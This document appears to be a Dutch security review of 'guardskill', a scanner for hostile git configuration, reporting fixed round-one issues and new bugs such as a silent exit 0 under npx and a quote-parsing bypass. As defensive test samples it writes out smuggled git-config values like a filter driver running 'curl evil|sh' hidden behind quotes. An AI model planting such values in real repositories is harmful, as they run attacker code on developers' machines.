# GUARDSKILL — REVIEW RONDE 2

### Onafhankelijke Security & Code Quality Reviewer · tag `v0.4.0-rc1` · commit `5c930b7` · 8 september 2026

**Uitkomst: 17 van de 17 bevindingen uit ronde 1 zijn GESLOTEN. Twee nieuwe bevindingen blokkeren publicatie, waarvan één de kern raakt: door `npx` uitgevoerd doet de scanner niets en geeft hij exit 0.** Beide fixes zijn klein en lokaal; de eerste heb ik geverifieerd.

---

## 1. BASELINE

| | |
|---|---|
| Reviewobject | tag `v0.4.0-rc1` → commit `5c930b7`, tree `35c53ce` |
| Herkomst | verse `git clone` van `github.com/soemoescode/guardskill`, niet de aangeleverde zip |
| Verificatie | HEAD op GitHub = HEAD op de machine = tag; werkboom schoon. De vijftien bronbestanden in de zip zijn byte-identiek aan de tag; de zip mist `docs/` en heeft `test/review01.test.js` waar de tag `test/review-01.test.js` heeft. **Beoordeeld is de gepushte staat**, want die zou gepubliceerd worden |
| Omgeving | Node 22.22.2, git 2.43.0, Linux |
| Suite | **73/73 groen, nul geskipt**, uit een schone kopie buiten de repository |
| npm | `registry.npmjs.org/guardskill` → nog steeds 404, de naam is vrij |

De procesafspraak is nagekomen: getagd, schone werkboom, vast doelwit. Dat maakte deze ronde ongeveer twee keer zo snel als ronde 1.

---

## 2. DE NEGEN BEWEZEN AANVALLEN — ALLE NEGEN GESLOTEN

Opnieuw uitgevoerd met echte git, tegen de gepushte build. Exitcode tussen haakjes.

| Aanval uit ronde 1 | v0.3.0 | v0.4.0-rc1 |
|---|---|---|
| `include.path` met de payload één bestand verderop | 1 medium, exit 0 | **critical `core-fsmonitor`** (exit 1); de include zelf informatief, want gelezen |
| `filter.clean = git -c alias.zz=!payload zz` | 0 findings, exit 0 | **critical `filter-driver`** (exit 1) |
| `pager.log`, `gpg.program`, `remote.uploadPack`/`receivePack`, `askPass`, `alternateRefsCommand`, `trailer.command`, `init.templateDir` | 0 findings, exit 0 | **7 high + 1 medium** (exit 1) |
| alias `st = -c core.pager=payload log` | 0 findings, exit 0 | **high `alias-shell`** (exit 1) |
| hook als symlink | 0 findings | **critical `hook-fetches-remote-code`** (exit 1) |
| `.GIT`-map met `core.fsmonitor` | 0 findings | **2 critical + medium `case-variant-git-dir`** (exit 1) |
| gesymlinkte `.git/config` buiten de boom | inhoud gelezen en afgedrukt | **high `symlinked-config`**, inhoud niet gelezen — de markerstring komt in geen enkel uitvoerkanaal voor |
| bare repo op diepte 10, standaardopties | "No findings", exit 0 | **2 critical** (exit 1) |
| niet-bestaand pad | exit 0 | **exit 2**, met een leesbare fout op stderr |

De drie valse positieven zijn ook weg, en de omgekeerde blindheid is dicht:

| | v0.3.0 | v0.4.0-rc1 |
|---|---|---|
| `git-lfs/git-lfs`, verse clone | **8 critical**, exit 1 | 8 **medium**, status CLEAN, exit 0 |
| sops / nbstripout / `clean = cat` / jupyter textconv | 7 **high**, exit 1 | 6 **low**, exit 0 |
| geneste `.gitmodules` met geregistreerde submodule | 2 high | 1 medium (alleen het echt ongeregistreerde `sub/.git`) |
| `credential.helper = store --file=/tmp/git-credentials` | stil | **high** |
| `--json` door een pipe | afgekapt op 65.536 bytes, ongeldige JSON | 1.570.097 bytes, **identiek aan de bestandsuitvoer, geldige JSON** |
| INCOMPLETE | exit 0 | exit 3, `status: INCOMPLETE`, `incompleteReasons`, en `--allow-incomplete` geeft 0 |

Extra steekproeven die ik zelf heb toegevoegd en die goed uitvielen: hooks-map die zelf een symlink naar buiten de boom is (critical, gevonden), include waarvan het doel een symlink naar buiten is (high, geweigerd, geen lek), root-level `.GIT` naast `.git` (critical), alias met `-ccore.pager=` (git weigert die vorm zelf, dus terecht geen finding), JSON-schema compleet inclusief `schemaVersion`, en de claim-pariteitstests die controleren dat de tabel naar bestaande tests wijst.

**Dispositie ronde 1: F-01 t/m F-16 en F-17.1 t/m F-17.8 → GESLOTEN.** De twee testwijzigingen zijn verantwoord en geen van beide een verzwakking; test 22 is ongewijzigd. De vier restrisico's R-1 t/m R-4 accepteer ik, met één kanttekening bij R-4 (zie N-2). De twee afwijkingen A-1 en A-2 accepteer ik: de eerlijke provenance-nota is beter dan een verzonnen SHA, en de verhoudingsassertie is een sterkere prestatietest dan een absolute grens op een gedeelde runner.

---

## 3. NIEUWE BEVINDING N-1 — DOOR `npx` UITGEVOERD DOET DE SCANNER NIETS EN GEEFT HIJ EXIT 0

**Severity: Critical · Confidence: High · Categorie: Correctness / Fail-open · Blokkeert publicatie**

Dit is de gepubliceerde toegangsweg. Reproductie met precies wat npm doet:

```
npm pack && npm install ./guardskill-0.4.0.tgz
node_modules/.bin/guardskill --version          -> geen uitvoer, exit 0
node_modules/.bin/guardskill <repo met fsmonitor> -> geen uitvoer, exit 0
npx guardskill --version                        -> geen uitvoer, exit 0

node node_modules/guardskill/src/cli.js --version -> 0.4.0
```

Oorzaak, `src/cli.js` regel 113:

```js
const invokedDirectly = process.argv[1] && import.meta.url === pathToFileURL(process.argv[1]).href;
```

`process.argv[1]` is het pad zoals aangeroepen, `import.meta.url` is het pad ná symlinkresolutie. Op Linux en macOS maakt npm `node_modules/.bin/<naam>` **als symlink**, dus die twee zijn nooit gelijk, `invokedDirectly` is false en `run()` wordt nooit aangeroepen. Geen uitvoer, geen findings, exitcode 0.

Waarom niets dit ving: op Windows maakt npm `.cmd`- en `.ps1`-shims die het echte pad meegeven, dus daar werkt het — en dat is de machine waarop gebouwd wordt. De 73 tests roepen de CLI altijd aan als `process.execPath` plus het scriptpad, nooit via `bin`. De CI-matrix draait `npm test` op ubuntu en macos, maar test het pakket niet. Er is geen enkele test die het `bin`-veld uitoefent.

Het is bovendien geïntroduceerd door de fix voor F-08: de guard is er gekomen om `cli.js` importeerbaar te maken voor de contract-test. Een fix die een erger gat opent is precies waarom stap 7 van het protocol bestaat.

Voor een securityscanner is dit de slechtste mogelijke faalmodus: stil, en exit 0 leest als schoon. Iedere gebruiker die de README volgt, krijgt dit.

**Fix, geverifieerd.** Vergelijk gerealiseerde paden:

```js
import { realpathSync } from 'node:fs';

const invokedDirectly = (() => {
  if (!process.argv[1]) return false;
  try { return import.meta.url === pathToFileURL(realpathSync(process.argv[1])).href; }
  catch { return false; }
})();
```

Met deze wijziging: `node_modules/.bin/guardskill --version` → `0.4.0`; scan van een repo met `core.fsmonitor` → 1 critical, exit 1; schone repo → exit 0; **73/73 tests blijven groen**. Structureel netter is een `bin/guardskill.js` van drie regels die `run()` importeert en aanroept, zodat `cli.js` geen guard meer nodig heeft; dat is de vorm die deze faalmodus onmogelijk maakt in plaats van hem te repareren.

**Verificatietest (moet in de CI, op alle drie de platformen):** een packaging-smoketest die `npm pack` doet, de tarball in een tijdelijke map installeert, en dan `node_modules/.bin/guardskill --version` én een scan van een kwetsbare fixture uitvoert — assert op uitvoer én exitcode. Dat had dit gevonden, en het is de enige test die het gepubliceerde artefact echt aanraakt. Mijn acceptatiepoort miste die stap; dat is mijn gat, en hij hoort er nu in.

---

## 4. NIEUWE BEVINDING N-2 — DE PARSER HEEFT GEEN QUOTE-STATE, DUS EEN PAYLOAD KAN ZICH ACHTER EEN AANHALINGSTEKEN VERSTOPPEN

**Severity: High · Confidence: High · Categorie: Security / False negative · Blokkeert publicatie**

Git behandelt `#` en `;` alleen als commentaar **buiten** aanhalingstekens. De parser strip commentaar zodra de waarde niet mét een aanhalingsteken *begint*, en negeert daarbij dat de rest van de regel gequote kan zijn:

```
config:  clean = cat" ; curl evil|sh"
git    : filter.x.clean = cat ; curl evil|sh      <- dit voert git uit
scanner: filter.x.clean = cat"                    <- dit beoordeelt de scanner
verdict: LOW, exit 0
```

`low` zit onder de standaarddrempel `high`, dus dit is een werkende omzeiling van de CI-poort op een filter driver — en die draait bij `git add` en bij checkout. Dezelfde vorm werkt op `core.pager` en `core.editor` (daar blijft het medium in plaats van te escaleren op het metateken) en op `core.fsmonitor`, `core.gitProxy` en `core.askPass`.

Een sweep van zestien quote-varianten tegen echte git: **vijftien wijken af**, in twee richtingen.

- **Gevaarlijk** (git ziet een metateken, de scanner niet): `cat" ; curl x|sh"`, `/tmp/a" ; "b`, `p" ; "q`, `a" # "b`, `vim" ;"`.
- **Valse positief** (git ziet iets ongevaarlijks, de scanner meldt): `"less" ; curl x|sh` en `less;curl x|sh` — git kapt daar af op het commentaarteken en houdt `less` over, de scanner meldt de hele regel.

Dit is de klasse die R-4 als "vier gedocumenteerde afwijkingen, alle vier naar de veilige kant" afsluit. Die conclusie klopt voor de vier gevallen in de gouden tabel, maar de tabel bevat geen enkel geval met een aanhalingsteken **midden in** de waarde, en de assertie "een niet-gedeclareerde afwijking faalt" kan alleen falen op wat erin staat. Een gouden tabel is zo sterk als zijn casusselectie — en dat is precies waarvoor property-based generatie bedoeld was, die naar v0.5.0 is geschoven.

**Fix:** één scanner over de waarde die de staat bijhoudt, zoals git het doet. Loop teken voor teken; binnen aanhalingstekens zijn `#` en `;` gewone tekens; `\` escapet `"`, `\`, `n`, `t`, `b`; buiten aanhalingstekens beëindigt `#` of `;` de waarde; gequote en ongequote stukken worden aan elkaar geplakt. Dat vervangt de huidige drietrapsbenadering (commentaar strippen, dan unquoten, dan escapes vervangen) en sluit de hele familie in plaats van vier gevallen.

**Verificatietests:** de zestien gevallen uit deze sweep in de gouden tabel, plus — en dit is het punt — een generator die quote-, commentaar- en escapeposities permuteert en elke variant tegen de ingecheckte git-antwoorden legt. Haal die generator naar v0.4.0; hij is twintig regels en hij is de enige verdediging tegen de volgende variant die niemand bedacht.

---

## 5. NIEUWE BEVINDING N-3 — ONGELIMITEERDE LEESACTIES: EEN VIJANDIGE MAP BEPAALT HET GEHEUGENGEBRUIK VAN DE SCANNER

**Severity: Medium · Confidence: High · Categorie: Security (tool zelf) / DoS**

`readHead()` leest het hele bestand en snijdt daarna af op 4096 bytes:

```js
async function readHead(file) {
  try { return (await readFile(file, 'utf-8')).slice(0, HEAD_BYTES); } catch { return ''; }
}
```

Gemeten piek-RSS bij een scan van een repository met één hookscript:

| hookscript | piek-RSS | exit |
|---|---|---|
| 20 bytes (normaal) | 46 MB | 1 |
| 100 MB | **250 MB** | 1 |
| 400 MB | **855 MB** | 1 |
| 1.200 MB | 569 MB, en de **inhoud wordt stil weggegooid** | 1 |

Twee gevolgen. Eén: het geheugengebruik is ongeveer tweemaal de bestandsgrootte, en één hookbestand van 100 MB breekt het prestatiebudget van 200 MB dat in de eigen suite staat. Dit is een lokale scanner die je juist draait op mappen die je niet vertrouwt. Twee: boven de maximale stringlengte van Node (~512 MB) faalt de conversie, `catch { return '' }` maakt daar een lege kop van, en een lege kop is niet te onderscheiden van "gelezen en niets gevonden" — een hook die code downloadt en met padding boven die grens wordt gebracht, zakt daardoor van `hook-fetches-remote-code` (critical) naar `active-hook` (high).

Dezelfde ongelimiteerde lezing zit op twee andere plekken: `.gitmodules` (een bestand van 200 MB → piek-RSS **658 MB**, exit 0) en het `.git`-bestand in `discovery.js`. Alleen het hoofdconfigpad heeft een `stat`-controle met `MAX_CONFIG_BYTES`.

**Fix:** één helper die een begrensd prefix leest met een filehandle (`open` + één `read` in een buffer van 4096 bytes) en die overal wordt gebruikt waar nu `readFile` staat: hookscripts, `.gitmodules`, het `.git`-bestand. Onderscheid daarbij "niet leesbaar" van "gelezen en schoon": een onleesbare of onwaarschijnlijk grote hook levert een eigen bevinding op en zet de scan op INCOMPLETE, in plaats van stil een niveau te zakken.

**Verificatietests:** een fixture met een hookscript van 8 MB (voldoende om de allocatie aan te tonen zonder de CI te belasten) met een assertie op piek-geheugen of op de leesgrootte; plus een test dat een hook met een remote-exec-patroon áchter 8 MB padding nog steeds critical is; plus dezelfde twee voor `.gitmodules`.

---

## 6. TWEE KLEINE PUNTEN

**N-4 — `status: CLEAN` terwijl er findings zijn.** Een scan met alleen findings onder de drempel geeft `status: "CLEAN"` mét een gevulde `summary`. Voor een machine die op `status` stuurt is dat misleidend; exitcode 0 is hier juist, de status niet. Voorstel: `status` beschrijft of er findings zijn (`CLEAN` alleen bij nul), de exitcode beschrijft de drempel. Aanvullend: bij `--json` en een ERROR komt er **geen JSON** op stdout, alleen tekst op stderr. Dat is verdedigbaar, maar het staat niet in het contract en niet in de afwijkingen; kies er één en test hem.

**N-5 — een `.GIT`-map escaleert naar critical op een bestandssysteem waar git hem negeert.** De medium-bevinding met de platformuitleg is precies goed. Maar de configuratie *binnen* die map wordt op volle severity gemeld, dus op Linux staat er `2 critical` voor een payload die daar niet live is, met er onder de melding dat git hem hier negeert. Voorstel: cap de severity van bevindingen uit een case-variant git-directory op een case-gevoelig volume, met dezelfde eerlijke tekst.

---

## 7. WAT ER GOED IS

- Alle 17 bevindingen zijn niet alleen gefixt maar **met de juiste vorm** gefixt: escalatie in plaats van een platte downgrade, `process.exitCode` in plaats van een grotere fixture, een lees-alleen probe zonder inode, een gouden tabel zonder subproces. Op elk punt waar ronde 1 een oplossing voorstelde die niet klopte, is er een betere gekomen.
- De dekkingstest en de inventaris met `covered`/`out-of-scope` per sleutel maken volledigheid controleerbaar in plaats van beloofd. De vier out-of-scope-redenen zijn houdbaar: `sendemail.smtpServer` en `instaweb.httpd` zitten achter commando's die een agent niet draait, `ssh.variant` noemt een variant en geen programma, `http.proxy` is een URL.
- De claim-pariteitstabel wordt door tests bewaakt die controleren dat elke genoemde test bestaat en dat de README geen klasse claimt zolang er sleutels buiten scope staan. Dat is de zeldzame vorm: documentatie die faalt in de CI.
- `release.yml` is goed: alleen op tags, verificatiematrix vóór publicatie, `id-token: write` alleen in de publish-job, tag-versus-versiecontrole, placeholderweigering, Actions op commit-SHA met de tag als comment. De `no-skipped-tests`-job doet precies wat hij moet doen.
- De eerlijke provenance-nota bij de corpus is beter dan wat de poort vroeg. Een verzonnen SHA in het bestand dat over herkomst gaat, zou erger zijn geweest dan een gereconstrueerde corpus.

---

## 8. EINDOORDEEL EN DE WEG NAAR NPM

**Publicatieadvies: nog niet — twee fixes, dan wel.** Nul `OPEN` op ronde 1, maar N-1 en N-2 zijn nieuw en blokkerend. Samen ongeveer een halve dag: N-1 is drie regels (geverifieerd) plus een packaging-smoketest, N-2 is één scanfunctie van pakweg vijfentwintig regels plus de zestien gevallen in de gouden tabel. N-3 hoort er in dezelfde ronde bij; N-4 en N-5 kunnen mee of naar v0.5.0.

Volgorde als het dicht is:

1. Fixes op `main`, suite groen, **packaging-smoketest toegevoegd aan de CI-matrix**.
2. Tag `v0.4.0-rc2`, ik verifieer de drie nieuwe bevindingen en draai het protocol opnieuw — korter, want de aanvalsset staat er al.
3. README-installatieregel terug naar `npx guardskill .` (en de CI-snippet in de README werkt dan ook).
4. npm-account plus een **automation token** als repo-secret `NPM_TOKEN`. Dat is wat `release.yml` nu verwacht, en `--provenance` werkt daarmee al, omdat de provenance-attestatie uit de OIDC-token van de job komt en niet uit het npm-token.
5. Tag `v0.4.0` pushen — let op: `v0.4.0-rc1` matcht het trigger-patroon bewust niet, dus alleen de definitieve tag publiceert. De workflow draait dan negen matrixcombinaties en publiceert daarna.
6. Verifiëren met precies het commando dat N-1 brak: `npx guardskill@latest --version` op een Linux- of macOS-machine, en één echte scan.
7. Daarna migreren naar npm **trusted publishing** (OIDC), zodat er helemaal geen npm-token meer in de repository-secrets staat: op npmjs.com bij het pakket een trusted publisher instellen voor `soemoescode/guardskill` met workflowbestand `release.yml`, en in de workflow `id-token: write` (staat er al) plus npm CLI 11.5.1 of nieuwer — Node 22.x levert npm 10, dus daar is één `npm install -g npm@latest`-stap of een nieuwere Node voor nodig. Provenance gaat dan automatisch. Voor een securitytool is "geen langlevend publicatietoken" het argument, niet het gemak.
8. Pas dan de twee weken stilte van Gate 1.

De naam `guardskill` is nog vrij; niemand is er tussen ronde 1 en nu op gaan zitten.

---

*Ronde 2 uitgevoerd tegen tag `v0.4.0-rc1` (commit `5c930b7`, tree `35c53ce`), geverifieerd tegen de gepushte staat op GitHub. Alle geciteerde uitvoer en alle metingen zijn werkelijk uitgevoerd in deze omgeving; waar iets niet is gereproduceerd, staat dat er expliciet bij. Referentie-implementatie: git 2.43.0. Bronnen: [git-config documentatie](https://git-scm.com/docs/git-config), [Node.js process-documentatie over stdout en process.exit](https://nodejs.org/api/process.html#a-note-on-process-io), [npm trusted publishing](https://docs.npmjs.com/trusted-publishers/), [npm registry](https://registry.npmjs.org/guardskill) (404 op 8 september 2026).*
